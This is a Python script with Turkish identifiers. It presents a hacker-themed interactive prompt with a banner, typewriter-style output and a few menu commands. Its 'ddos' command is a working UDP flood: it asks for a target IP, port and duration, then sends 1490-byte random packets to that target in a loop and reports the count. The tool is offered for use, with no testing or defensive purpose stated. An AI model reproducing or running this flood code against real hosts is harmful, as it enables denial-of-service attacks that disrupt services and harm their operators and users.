import time
import sys
import os
import socket
import random

RESET = "\033[0m"
BOLD = "\033[1m"
RED = "\033[31m"
GREEN = "\033[32m"
YELLOW = "\033[33m"
BLUE = "\033[34m"
MAGENTA = "\033[35m"
CYAN = "\033[36m"
WHITE = "\033[37m"

userRootDurumu = "Root" if os.geteuid() == 0 else "User"

help_text = """
ls       : List files in the current directory
clear    : Clear the screen
exit     : Exit the program
ddos     : Start a DDoS attack
help     : Show this help message
"""

ascii_banner = f"""
███████████████████████████████████
█▄─▄─▀██▀▄─██▄─▄▄▀█─█─█▄─▄▄─█▄─▀─▄█
██─▄─▀██─▀─███─██─█─▄─██─▄█▀██▀─▀██
▀▄▄▄▄▀▀▄▄▀▄▄▀▄▄▄▄▀▀▄▀▄▀▄▄▄▄▄▀▄▄█▄▄▀
"""
def vip(yazi, bekleme=0.04):
    for harf in yazi:
        sys.stdout.write(harf)
        sys.stdout.flush()
        time.sleep(bekleme)
    print()  # satır sonu


def vip_input(yazi, bekleme=0.02):
    for harf in yazi:
        sys.stdout.write(harf)
        sys.stdout.flush()
        time.sleep(bekleme)
    return input()  # kullanıcıdan giriş al ve geriye döndürs

os.system("clear")
print("               Loading...")
print("")
vip("⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿")
time.sleep(2)
os.system("clear")
print(f"{RED}{BOLD}" + ascii_banner + f"{RESET}")
vip(f"{GREEN}Version:{RESET} 1.0.4")
print("")   

while True:
   print(f"{RED}┌──{BOLD}[{YELLOW}"+ userRootDurumu +f"{BOLD}{RED}]{RESET}{RED}-{BOLD}{RED}[{BOLD}{YELLOW}~{BOLD}{RED}]{RESET}") 
   cevap = vip_input(f"{RED}└─${RESET} ")
   if cevap == "clear":
       os.system(cevap)
   elif cevap == "undertale":
       os.system("cat ascii.txt")
   elif cevap == "exit":
       break
   elif cevap == "ls":
       os.system(cevap)    
   elif cevap == "help":
       print(help_text) 
   elif cevap == "":
       continue
   elif cevap == "reboot":
        os.system(cevap)
   elif cevap == "bangin ballz my man":
       vip(f"{YELLOW}You Are Used The Secret Words!{RESET}")
       vip(f"{GREEN}+400 Rizz{RESET}")
       print("")  
   elif cevap == "ddos":
         os.system("clear")
         vip(f"{CYAN}Starting DDoS attack...{RESET}")
         time.sleep(1)
         ip = vip_input(f"{YELLOW}Enter target IP address: {RESET}")
         port = int(vip_input(f"{YELLOW}Enter target port (default 80): {RESET}") or "80")
         duration = int(vip_input(f"{YELLOW}Enter attack duration in seconds (default 60): {RESET}") or "60")
         vip(f"{GREEN}Attacking {ip}:{port} for {duration} seconds...{RESET}")
         timeout = time.time() + duration
         sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         bytes = random._urandom(1490)
         sent_packets = 0
         while time.time() < timeout:
              sock.sendto(bytes, (ip, port))
              sent_packets += 1
              if sent_packets % 1000 == 0:
                print(f"{YELLOW}Sent {sent_packets} packets to {ip}:{port}{RESET}")
         vip(f"{GREEN}DDoS attack on {ip}:{port} completed. Total packets sent: {sent_packets}{RESET}")
   else:
        vip(f"{YELLOW}Unknown Command: {cevap}{RESET}")
